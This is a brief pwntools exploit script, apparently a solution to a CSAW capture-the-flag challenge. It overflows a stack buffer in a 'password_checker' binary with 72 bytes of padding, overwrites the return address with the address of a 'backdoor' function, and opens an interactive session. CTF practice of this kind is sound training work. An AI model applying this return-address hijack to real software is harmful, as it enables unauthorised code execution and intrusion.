from pwn import *

e = ELF('password_checker')
io = remote('pwn.chal.csaw.io', 5000)
io.recvuntil('>')

offset = b'a' * 72
payload = offset + p64(e.symbols['backdoor'])
io.sendline(payload)
io.interactive()